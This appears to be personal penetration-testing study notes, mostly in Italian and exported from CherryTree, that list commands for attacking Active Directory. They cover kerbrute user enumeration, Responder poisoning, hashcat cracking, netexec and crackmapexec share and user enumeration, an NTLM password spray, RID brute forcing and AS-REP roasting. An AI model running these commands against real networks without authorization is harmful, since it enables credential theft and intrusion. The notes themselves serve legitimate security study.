<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>AD enum</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>AD enum</h1><br/><p><a href="https://github.com/BrunotheCesar/Active-Directory-Enumeration-Attacks">https://github.com/BrunotheCesar/Active-Directory-Enumeration-Attacks</a></p><p><ol><li>1) <strong><span style="color:#071ba3;">1) kerbrute</span></strong></li></ol></p><p></p><p><h3>$kerbrute userenum -d DOMAIN.LOCAL --dc 172.16.5.5 file.txt -o usernames</h3></p><p><ol><li>2) <strong><span style="color:#071ba3;">2) LLMNR/NBT-NS Poisoning</span></strong></li></ol></p><p></p><p><h3>$sudo responder -I </h3><span style="color:#ff0000;">eth0</span></p><p></p><p>Trovati gli hash, crackiamo:</p><p><h3>$</h3><h3>hashcat -m 5600 FILE_HASH /usr/share/wordlists/rockyou.txt</h3></p><p></p><p>---------------------------------------------------------------------------------------------------------------------------------------</p><p></p><p><em>Altri tool da utilizzare:</em></p><p><ol><li>1) <strong><span style="color:#071ba3;">1) NMAP</span></strong></li></ol></p><p></p><p><em><h3># For a full domain scan.</h3></em><h3></h3></p><p><h3></h3><h3>nmap -Pn -p- -sC -sV -oA full_scan &lt;IP Range&gt;</h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><em><h3># Checking for a specific range of top ports.</h3></em><h3></h3></p><p><h3></h3><h3>nmap -T4 -A -iL targets.txt --top-ports=1000 -oA nmap_top1000</h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3># For enumerating LDAP information passively.</h3><h3></h3></p><p><h3></h3><h3>nmap -n -sV --script &quot;ldap* and not brute&quot; &lt;Domain Controller IP&gt;</h3></p><p></p><p><em>Per evadere il firewall ci sono vari modi (che possono funzionare come no), tra cui</em><em><span style="color:#ff0000;"> </span></em><span style="color:#ff0000;">--source-port 53 </span></p><p></p><p><ol><li>2) <strong><span style="color:#071ba3;">2) NetExec</span></strong></li></ol></p><p></p><p><em><h3># Enumerate a Range of IPs</h3></em><h3></h3></p><p><h3></h3><h3>netexec smb &lt;IP Range&gt;</h3></p><p></p><p><em><h3># Enumerate Users (These can also be tried with user credentials)</h3></em><h3></h3></p><p><h3></h3><h3>netexec smb &lt;Target IP Range&gt; --users</h3><h3></h3></p><p><h3>netexec smb &lt;Domain Controller IP&gt; -u &#39;USERNAME&#39; -p &#39;PASSWORD&#39; --users</h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><em><h3># Enumerate Open Shares (These can also be tried with user credentials)</h3></em><h3></h3></p><p><h3></h3><h3>netexec smb &lt;Target IP Range&gt; --shares</h3><h3></h3></p><p><h3>netexec smb &lt;Domain Controller IP&gt; -u &#39;USERNAME&#39; -p &#39;PASSWORD&#39; --shares</h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><em><h3># Enumerate Password Policy (These can also be tried with user credentials)</h3></em><h3></h3></p><p><h3></h3><h3>netexec smb &lt;Target IP Range&gt; --pass-pol</h3><h3></h3></p><p><h3>netexec smb &lt;Domain Controller IP&gt; -u &#39;USERNAME&#39; -p &#39;PASSWORD&#39; --pass-pol</h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><em><h3># Enumerate for Hosts with SMB Signing not Required</h3></em><h3></h3></p><p><h3></h3><h3>netexec smb &lt;Target IP Range&gt; --gen-relay-list relay_list.txt</h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><em><h3># Guest Access may also be available.</h3></em><h3></h3></p><p><h3></h3><h3>netexec smb &lt;Target IP Range&gt; -u &#39;a&#39; -p &#39;&#39; --shares</h3></p><p></p><p><em>Se troviamo un open share possiamo connetterci:</em></p><p><span style="color:#ff0000;">smbclient //&lt;Share IP Address&gt;/&lt;Sharename&gt; -U &lt;Domain&gt;/Username</span></p><p><ol><li>3) <strong><span style="color:#071ba3;">3) enum4linux</span></strong></li></ol></p><p></p><p><span style="color:#ff0000;">enum4linux &lt;Domain Controller IP&gt;</span></p><p><ol><li>4) <strong><span style="color:#071ba3;">4) Se voglio vedere quale host è raggiungibile, posso usare “fping”:</span></strong></li></ol></p><p></p><p><span style="color:#ff0000;">fping -g 192.168.56.1/24 2&gt;/dev/null | grep -v &quot;is unreachable&quot;</span></p><p><ol><li>5) <strong><span style="color:#071ba3;">5) NBTScan</span></strong><strong> </strong></li></ol></p><p></p><p><span style="color:#ff0000;">nbtscan -r IP_RANGE</span></p><p><ol><li>6) <strong><span style="color:#071ba3;">6) Responder</span></strong></li></ol></p><p></p><p><em><h3># Check the network in Analyzer mode</h3></em><h3></h3></p><p><h3></h3><h3>responder -I &lt;ATTACKER&#39;s INTERFACE&gt; -A</h3></p><p><ol><li>7) <strong><span style="color:#071ba3;">7) TCPdump &amp; Wireshark</span></strong></li></ol></p><p></p><p><em># Capture network traffic and store in .pcap file</em></p><p><span style="color:#ff0000;">tcpdump -i &lt;ATTACKER INTERFACE&gt; -w networkcapture.pcap</span></p><p></p><p><em>Open the captured .pcap file with wireshark and review for sensitive network protocols.</em></p><p></p><p><em># Wireshark Search Terms</em></p><p><span style="color:#ff0000;">llmnr</span><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;">nbns</span><span style="color:#ff0000;"></span></p><p><span style="color:#ff0000;">mdns</span></p><p><ol><li>8) <strong><span style="color:#071ba3;">8) Se abbiamo accesso ad un command prompt di una macchina target nel dominio:</span></strong></p><p></li></ol><img src="images/122-1.png" alt="images/122-1.png" /></p><p><ol><li>9) <strong><span style="color:#071ba3;">9) ntlm_passwordspry (da testare)</span></strong></li></ol></p><p></p><p><a href="https://github.com/Mr-Whiskerss/Windows_AD_Script_Dump/blob/main/ntlm_passwordspray.py">https://github.com/Mr-Whiskerss/Windows_AD_Script_Dump/blob/main/ntlm_passwordspray.py</a></p><p></p><p><span style="color:#ff0000;">python ntlm_passwordspray.py -u &lt;userfile&gt; -f &lt;fqdn&gt; -p &lt;password&gt; -a &lt;attackurl&gt;</span></p><p></p><p><em>We provide the following values for each of the parameters:</em><em></em></p><p><em></em><em></em></p><p><em>&lt;userfile&gt; - Textfile containing our usernames - &quot;usernames.txt&quot;</em><em></em></p><p><em>&lt;fqdn&gt; - Fully qualified domain name associated with the organisation that we are attacking - &quot;my.domain.com&quot;</em><em></em></p><p><em>&lt;password&gt; - The password we want to use for our spraying attack - &quot;Changeme2023&quot;</em><em></em></p><p><em>&lt;attackurl&gt; - The URL of the application that supports Windows Authentication - &quot;http://ntlmauth.my.domain.com&quot;</em></p><p></p><p>Example:</p><p>[thm@thm]$ <span style="color:#ff0000;">python ntlm_passwordspray.py -u usernames.txt -f my.domain.com -p Changeme2023 -a http://ntlmauth.my.domain.com/</span></p><p>[*] Starting passwords spray attack using the following password: Changeme2023</p><p>[-] Failed login with Username: john.doe</p><p>[-] Failed login with Username: jane.doe</p><p>[...]</p><p>[+] Valid credential pair found! Username: kiosec Password: Changeme2023</p><p>[...]</p><p></p><p><ol><li>10) <strong><span style="color:#071ba3;">10) RPCClient-Anonymous</span></strong></li></ol></p><p></p><p><em>The following command attempt to connect to the NetBIOS server anonymously, in order to enumerate using MS-RPC available commands/functions:</em></p><p></p><p><span style="color:#ff0000;">rpcclient -U ‘’ -N TARGET-IP</span></p><p></p><p><em>Per altro su RPCClient:</em> <a href="https://www.hackingarticles.in/active-directory-enumeration-rpcclient/">https://www.hackingarticles.in/active-directory-enumeration-rpcclient/</a></p><p><ol><li><strong><span style="color:#071ba3;">Crackmapexec</span></strong></li></ol></p><p></p><p><em>Innanzitutto eseguiamo il seguente comando per vedere se c&#39;è una null session.</em></p><p></p><p><span style="color:#ff0000;">crackmapexec smb IP -u ‘’ -p ‘’</span></p><p></p><p><em>Se la risposta è “ACCESS DENIED” possiamo provare un guest user:</em></p><p></p><p><span style="color:#ff0000;">crackmapexec smb IP -u ‘guest’ -p ‘’</span></p><p></p><p><em>Es:</em></p><p><img src="images/122-2.png" alt="images/122-2.png" /></p><p></p><p><em>Se è disponibile, possiamo iniziare con l&#39;enumeration e fare diverse operazioni:</em></p><p></p><p><span style="color:#ff0000;">crackmapexec smb 10.0.2.8 -u ‘guest’ -p ‘’  --shares</span> 				→ <em>Per gli shares</em></p><p></p><p><em>Es:</em></p><p><img src="images/122-3.png" alt="images/122-3.png" /></p><p></p><p><em>Trovando un READ access possiamo come exploit un IRD brute forcing attack:</em></p><p></p><p><span style="color:#ff0000;">crackmapexec smb IP -u ‘guest’ -p ‘’  --rid-brute</span></p><p></p><p><em>Possiamo salvare l&#39;output in un file. Per vedere solo gli utenti disponibili:</em></p><p></p><p><span style="color:#ff0000;">cat FILE.txt | grep -i user</span></p><p></p><p><em>A questo punto è possibile effettuare un ASREP Roasting attack:</em></p><p></p><p><span style="color:#ff0000;">impacket-GetNPUsers DOMAIN/ -userfile users.txt</span></p><p></p><p><em>Con questo comando potremmo individuare e catturare degli hash, da crackare poi con hashcat. </em></p><p></p><p></p><p>--------------------------------------------------------------------------------------------------------</p><p><span style="color:#071ba3;">Interessanti:</span></p><p><a href="https://github.com/Leo4j/Invoke-ADEnum">https://github.com/Leo4j/Invoke-ADEnum</a></p><p><a href="https://github.com/Kiosec/AD-Exploitation">https://github.com/Kiosec/AD-Exploitation</a></p><p></p><p>---------------------------------------------------------------------------------------------------------</p></div>
</body>
</html>
